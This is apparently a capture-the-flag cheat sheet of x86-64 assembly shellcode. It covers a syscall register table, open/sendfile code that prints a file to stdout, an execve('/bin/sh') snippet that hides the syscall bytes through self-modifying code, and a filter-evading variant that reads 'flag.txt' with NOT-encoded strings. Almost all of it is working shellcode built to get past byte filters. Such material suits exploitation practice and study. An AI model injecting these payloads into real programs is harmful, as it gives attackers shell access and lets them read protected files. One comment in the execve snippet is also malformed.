### `syscall`

| **reg** | **represent**  |
| ------- | -------------- |
| rax     | syscall number |
| rdi     | arg1           |
| rsi     | arg2           |
| rdx     | arg3           |
| r10     | arg4           |
| r8      | arg5           |
| r9      | arg6           |
- [syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit)
### open()
```asm
	mov rax, 2 /* sys_open = 2 = open() */
	lea rdi, [rip+fname] /* rdi = file_name addr pointer */
	xor rsi, rsi /* rsi = 0 = O_RDONLY */
	xor rdx, rdx /* rdx = 0 = mode */
	syscall /* open("./file_name", 0, 0) */

fname:
    .ascii "./file_name"
    .byte 0
```
### sendfile()
```asm
	mov rsi, rax            /* rsi = rax = file_descriptor */
	mov rdi, 1              /* rdi = 1 = stdout */
	xor rdx, rdx            /* rdx = offset = NULL */
	mov r10, 0x100          /* r10 = 0x100 = read 0x100 */
	mov rax, 40             /* rax = 40 = sendfile() */
	syscall                 /* sendfile(int out_fd, int in_fd, off_t *offset, size_t count) */

fname:
    .ascii "./file_name"    /* string */
    .byte 0                 /* add NULL for kernel to end */
```
### execv("/bin/sh") without syscall 
```asm
    mov rax, 59                 /* rax = 59 = execve() */
    mov rbx, 29400045130965551  /* rbx = "/bin/sh" */
    push rbx                    /* push "/bin/sh" onto stack */
    mov rdi, rsp                /* rdi = pointer to "/bin/sh" */
    xor rsi, rsi                /* rsi = 0 = argv */
    xor rdx, rdx                /* rdx = 0 = envp */

    lea rcx, [rip + skip]       /* bypass syscall = \x0f\x05 */
    inc byte ptr [rcx] 

    .byte 0x0f /                * add 0x0f at end */
    /* execv(int *pointer_to_bin/sh, argv, envp) */
skip:
    .byte 0x04
```
### open(), sendfile() with blacklist
```asm
    push 0
    mov rbx, 0x8b878bd1989e9399 /*NOT 'flag.txt'*/
    not rbx                     /*'flag.txt'*/
    push rbx                    
    mov rdi, rsp                /* rdi = pointer to 'flag.txt' */
    push 0                      /* rsi = 0 */
    pop rsi
    push 0                      /* rdx = 0 */
    pop rdx
    push 2                      /* rax = 2 = =open()) */
    pop rax
    syscall
    
    mov rsi, rax                /* rsi = file descriptor = 2 */
    mov edi, 1                  /* rdi = 1 = stdout */
    push 0                      /* rdx = 0 */
    pop rdx
    push 100                    /* r10 = 100 = read 100 bytes */
    pop r10        
    push 40                     /* rax = 40 = sendfile() */
    pop rax
    syscall
    
    push 60                     /* rax = 60 = exit() */
    pop rax
    syscall
```